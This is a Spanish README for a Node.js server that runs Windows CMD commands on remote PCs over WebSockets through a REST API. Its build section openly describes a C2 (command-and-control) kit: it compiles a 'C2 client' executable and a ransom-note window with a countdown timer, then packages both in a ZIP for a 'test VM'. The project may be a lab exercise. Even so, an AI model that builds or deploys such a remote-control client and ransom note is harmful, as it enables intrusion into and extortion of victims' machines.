# Servidor de Comandos CMD

Servidor Node.js que permite ejecutar comandos de Windows CMD localmente o remotamente en múltiples PCs conectadas a través de WebSockets.

## 📁 Estructura del Proyecto

```
├── server.js           # Backend (API REST + WebSocket)
├── cliente.js          # Cliente para ejecutar en PC2
├── iniciar-cliente.bat # Script para iniciar el cliente fácilmente
├── public/             # Frontend
│   ├── index.html      # Página principal
│   ├── css/
│   │   └── style.css   # Estilos
│   └── js/
│       └── main.js     # JavaScript del cliente
├── package.json
├── README.md
└── INSTRUCCIONES.md    # Instrucciones detalladas para usar el cliente remoto
```

## 🚀 Instalación

1. Instala las dependencias:
```bash
npm install
```

## ▶️ Uso

Inicia el servidor:
```bash
npm start
```

El servidor estará disponible en: `http://localhost:3000`

## 📖 API

### POST `/api/ejecutar`
Ejecuta un comando CMD.

**Body:**
```json
{
  "comando": "dir"
}
```

**Respuesta:**
```json
{
  "success": true,
  "comando": "dir",
  "resultado": {
    "exitCode": 0,
    "stdout": "...",
    "stderr": ""
  }
}
```

### GET `/api/status`
Verifica el estado del servidor.

**Respuesta:**
```json
{
  "status": "ok",
  "mensaje": "Servidor de comandos CMD funcionando",
  "timestamp": "2024-01-01T00:00:00.000Z",
  "clientesConectados": []
}
```

### GET `/api/clientes`
Obtiene la lista de clientes conectados.

**Respuesta:**
```json
{
  "success": true,
  "clientes": [
    {
      "id": "socket-id",
      "nombre": "PC2",
      "hostname": "PC2-NAME",
      "timestamp": "2024-01-01T00:00:00.000Z"
    }
  ]
}
```

### POST `/api/ejecutar-remoto`
Ejecuta un comando en un cliente remoto conectado.

**Body:**
```json
{
  "clienteId": "socket-id",
  "comando": "dir",
  "comandoId": "1234567890"
}
```

**Respuesta:**
```json
{
  "success": true,
  "clienteId": "socket-id",
  "comando": "dir",
  "resultado": {
    "exitCode": 0,
    "stdout": "...",
    "stderr": ""
  }
}
```

## 🖥️ Interfaz Web

Abre `http://localhost:3000` en tu navegador para usar la interfaz web interactiva.

## 📡 Cliente Remoto (PC2)

Puedes ejecutar comandos remotamente en otras PCs conectadas:

1. **Configurar cliente en PC2:**
   - Edita `cliente.js` y cambia `SERVER_URL` por la IP de PC1
   - O usa `iniciar-cliente.bat` configurando la IP del servidor

2. **Crear ejecutable (opcional):**
```bash
npm run build-client
```

3. **Ejecutar cliente en PC2:**
   - Opción A: `node cliente.js`
   - Opción B: Doble clic en `iniciar-cliente.bat`
   - Opción C: Ejecutar `cliente.exe` (después de crearlo)

4. **Ver clientes conectados:**
   - Abre `http://localhost:3000` en PC1
   - Verás la lista de clientes conectados
   - Selecciona un cliente y ejecuta comandos remotamente

📖 **Para instrucciones detalladas, ver `INSTRUCCIONES.md`**

## ⚠️ Seguridad

**IMPORTANTE:** Este servidor ejecuta comandos directamente en tu sistema. Úsalo solo en entornos seguros y no lo expongas a internet sin autenticación adecuada.

## 📝 Ejemplos de Uso

### Desde la terminal con curl:
```bash
curl -X POST http://localhost:3000/api/ejecutar -H "Content-Type: application/json" -d "{\"comando\":\"dir\"}"
```

### Desde JavaScript:
```javascript
fetch('http://localhost:3000/api/ejecutar', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ comando: 'ipconfig' })
})
.then(res => res.json())
.then(data => console.log(data));
```

comando para crear ejecutable:
npm install -g pkg   
pkg cliente.js --targets node18-win-x64 --output cliente.exe

## 🔧 Compilación de Ejecutables

### 1. Cliente Node.js (cliente.exe)

```bash
cd "c:\Users\ASUS Vivobook\Desktop\New folder\C2"

# Instalar pkg globalmente (una vez)
npm install -g pkg

# Compilar cliente
pkg cliente.js --targets node18-win-x64 --output cliente.exe
```

### 2. Nota de Rescate Python (nota_rescate.exe)

```bash
# Instalar PyInstaller (una vez)
pip install pyinstaller

# Compilar la interfaz
pyinstaller --onefile --windowed --name nota_rescate interfazdeaviso.py

# El ejecutable estará en dist/nota_rescate.exe
```

### 3. Crear ZIP para VM de prueba

```bash
# Copiar ejecutable de PyInstaller al directorio principal
copy dist\nota_rescate.exe .

# Crear archivo ZIP con ambos ejecutables
powershell Compress-Archive -Path cliente.exe,nota_rescate.exe -DestinationPath C2_Cliente.zip
```

### 📦 Contenido del ZIP

```
C2_Cliente.zip/
├── cliente.exe        # Cliente C2 (conecta al servidor)
└── nota_rescate.exe   # Ventana de rescate (temporizador)
```

### ⚠️ Configuración antes de compilar

Antes de compilar `cliente.js`, edita la línea 10 con la IP del servidor:

```javascript
const SERVER_URL = 'http://TU_IP_SERVIDOR:3000';
```